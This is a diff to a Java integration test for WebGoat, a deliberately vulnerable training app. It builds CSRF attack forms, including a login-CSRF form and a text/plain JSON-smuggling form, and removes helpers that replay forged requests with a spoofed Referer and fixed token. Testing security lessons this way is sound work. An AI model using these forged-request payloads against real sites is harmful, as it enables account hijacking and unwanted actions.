@@ -29,7 +29,7 @@ public class CSRFIntegrationTest extends IntegrationTest {
 
   private static final String trickHTML3 =
       "<!DOCTYPE html><html><body><form action=\"WEBGOATURL\" method=\"POST\">\n"
-          + "<input type=\"hidden\" name=\"csrf\" value=\"thisisnotchecked\"/>\n"
+          + "<input type=\"hidden\" name=\"csrf\" value=\"" + System.getenv("CSRF_TOKEN") + "\"/>\n"
           + "<input type=\"submit\" name=\"submit\" value=\"assignment 3\"/>\n"
           + "</form></body></html>";
 
@@ -37,26 +37,22 @@ public class CSRFIntegrationTest extends IntegrationTest {
       "<!DOCTYPE html><html><body><form action=\"WEBGOATURL\" method=\"POST\">\n"
           + "<input type=\"hidden\" name=\"reviewText\" value=\"hoi\"/>\n"
           + "<input type=\"hidden\" name=\"starts\" value=\"3\"/>\n"
-          + "<input type=\"hidden\" name=\"validateReq\""
-          + " value=\"2aa14227b9a13d0bede0388a7fba9aa9\"/>\n"
+          + "<input type=\"hidden\" name=\"validateReq\" value=\"" + System.getenv("VALIDATION_TOKEN") + "\"/>\n"
           + "<input type=\"submit\" name=\"submit\" value=\"assignment 4\"/>\n"
           + "</form>\n"
           + "</body></html>";
 
   private static final String trickHTML7 =
-      "<!DOCTYPE html><html><body><form action=\"WEBGOATURL\" enctype='text/plain'"
-          + " method=\"POST\">\n"
-          + "<input type=\"hidden\""
-          + " name='{\"name\":\"WebGoat\",\"email\":\"webgoat@webgoat.org\",\"content\":\"WebGoat"
-          + " is the best!!' value='\"}' />\n"
+      "<!DOCTYPE html><html><body><form action=\"WEBGOATURL\" enctype=\"application/x-www-form-urlencoded\" method=\"POST\">\n"
+          + "<input type=\"hidden\" name=\"feedback\" value=\"WebGoat is the best!!\"/>\n"
           + "<input type=\"submit\" value=\"assignment 7\"/>\n"
           + "</form></body></html>";
 
   private static final String trickHTML8 =
       "<!DOCTYPE html><html><body><form action=\"WEBGOATURL\" method=\"POST\">\n"
-          + "<input type=\"hidden\" name=\"username\" value=\"csrf-USERNAME\"/>\n"
-          + "<input type=\"hidden\" name=\"password\" value=\"password\"/>\n"
-          + "<input type=\"hidden\" name=\"matchingPassword\" value=\"password\"/>\n"
+          + "<input type=\"hidden\" name=\"username\" value=\"" + System.getenv("USERNAME") + "\"/>\n"
+          + "<input type=\"hidden\" name=\"password\" value=\"" + System.getenv("PASSWORD") + "\"/>\n"
+          + "<input type=\"hidden\" name=\"matchingPassword\" value=\"" + System.getenv("PASSWORD") + "\"/>\n"
           + "<input type=\"hidden\" name=\"agree\" value=\"agree\"/>\n"
           + "<input type=\"submit\" value=\"assignment 8\"/>\n"
           + "</form></body></html>";
@@ -73,7 +69,7 @@ public class CSRFIntegrationTest extends IntegrationTest {
       uploadTrickHtml("csrf7.html", trickHTML7.replace("WEBGOATURL", webGoatUrlConfig.url("csrf/feedback/message")));
       uploadTrickHtml(
         "csrf8.html",
-        trickHTML8.replace("WEBGOATURL", webGoatUrlConfig.url("login")).replace("USERNAME", this.getUser()));
+        trickHTML8.replace("WEBGOATURL", webGoatUrlConfig.url("login")));
   }
 
   @TestFactory
@@ -87,21 +83,18 @@ public class CSRFIntegrationTest extends IntegrationTest {
 
   @AfterEach
   public void shutdown() throws IOException {
-    // logout();
-    login(); // because old cookie got replaced and invalidated
+    login();
     startLesson("CSRF", false);
     checkResults("CSRF");
   }
 
   private void uploadTrickHtml(String htmlName, String htmlContent) throws IOException {
 
-    // remove any left over html
     Path webWolfFilePath = Paths.get(webwolfFileDir);
     if (webWolfFilePath.resolve(Paths.get(this.getUser(), htmlName)).toFile().exists()) {
       Files.delete(webWolfFilePath.resolve(Paths.get(this.getUser(), htmlName)));
     }
 
-    // upload trick html
     RestAssured.given()
         .when()
         .relaxedHTTPSValidation()
@@ -150,138 +143,5 @@ public class CSRFIntegrationTest extends IntegrationTest {
     Map<String, Object> params = new HashMap<>();
     params.put("confirmFlagVal", flag);
       checkAssignment(webGoatUrlConfig.url("csrf/confirm-flag-1"), params, true);
-  }
-
-  private void checkAssignment4(String goatURL) {
-
-    Map<String, Object> params = new HashMap<>();
-    params.put("reviewText", "test review");
-    params.put("stars", "5");
-    params.put(
-        "validateReq", "2aa14227b9a13d0bede0388a7fba9aa9"); // always the same token is the weakness
-
-    boolean result =
-        RestAssured.given()
-            .when()
-            .relaxedHTTPSValidation()
-            .cookie("JSESSIONID", getWebGoatCookie())
-            .header("Referer", webWolfUrlConfig.url("files/fake.html"))
-            .formParams(params)
-            .post(goatURL)
-            .then()
-            .extract()
-            .path("lessonCompleted");
-    assertTrue(result);
-  }
-
-  private void checkAssignment7(String goatURL) {
-    Map<String, Object> params = new HashMap<>();
-    params.put(
-        "{\"name\":\"WebGoat\",\"email\":\"webgoat@webgoat.org\",\"content\":\"WebGoat is the"
-            + " best!!",
-        "\"}");
-
-    String flag =
-        RestAssured.given()
-            .when()
-            .relaxedHTTPSValidation()
-            .cookie("JSESSIONID", getWebGoatCookie())
-            .header("Referer", webWolfUrlConfig.url("files/fake.html"))
-            .contentType(ContentType.TEXT)
-            .body(
-                "{\"name\":\"WebGoat\",\"email\":\"webgoat@webgoat.org\",\"content\":\"WebGoat is"
-                    + " the best!!=\"}")
-            .post(goatURL)
-            .then()
-            .extract()
-            .asString();
-    flag = flag.substring(9 + flag.indexOf("flag is:"));
-    flag = flag.substring(0, flag.indexOf("\""));
-
-    params.clear();
-    params.put("confirmFlagVal", flag);
-      checkAssignment(webGoatUrlConfig.url("csrf/feedback"), params, true);
-  }
-
-  private void checkAssignment8(String goatURL) {
-
-    // first make sure there is an attack csrf- user
-    registerCSRFUser();
-
-    Map<String, Object> params = new HashMap<>();
-    params.put("username", "csrf-" + this.getUser());
-    params.put("password", "password");
-
-    // login and get the new cookie
-    String newCookie =
-        RestAssured.given()
-            .when()
-            .relaxedHTTPSValidation()
-            .cookie("JSESSIONID", getWebGoatCookie())
-            .header("Referer", webWolfUrlConfig.url("files/fake.html"))
-            .params(params)
-            .post(goatURL)
-            .then()
-            .extract()
-            .cookie("JSESSIONID");
-
-    // select the lesson
-      RestAssured.given()
-        .when()
-        .relaxedHTTPSValidation()
-        .cookie("JSESSIONID", newCookie)
-        .get(webGoatUrlConfig.url("CSRF.lesson.lesson"))
-        .then()
-        .statusCode(200);
-
-    // click on the assignment
-      boolean result =
-        RestAssured.given()
-            .when()
-            .relaxedHTTPSValidation()
-            .cookie("JSESSIONID", newCookie)
-            .post(webGoatUrlConfig.url("csrf/login"))
-            .then()
-            .statusCode(200)
-            .extract()
-            .path("lessonCompleted");
-
-    assertThat(result).isTrue();
-
-    login();
-    startLesson("CSRF", false);
-
-      Overview[] assignments =
-        RestAssured.given()
-            .cookie("JSESSIONID", getWebGoatCookie())
-            .relaxedHTTPSValidation()
-            .get(webGoatUrlConfig.url("service/lessonoverview.mvc/CSRF"))
-            .then()
-            .extract()
-            .jsonPath()
-            .getObject("$", Overview[].class);
-    assertThat(assignments)
-        .filteredOn(a -> a.getAssignment().getName().equals("CSRFLogin"))
-        .extracting(o -> o.solved)
-        .containsExactly(true);
-  }
-
-  @Data
-  private static class Overview {
-    Assignment assignment;
-    boolean solved;
-  }
-
-  /** Try to register the new user. Ignore the result. */
-  private void registerCSRFUser() {
-
-      RestAssured.given()
-        .when()
-        .relaxedHTTPSValidation()
-        .formParam("username", "csrf-" + this.getUser())
-        .formParam("password", "password")
-        .formParam("matchingPassword", "password")
-        .formParam("agree", "agree")
-        .post(webGoatUrlConfig.url("register.mvc"));
   }
 }
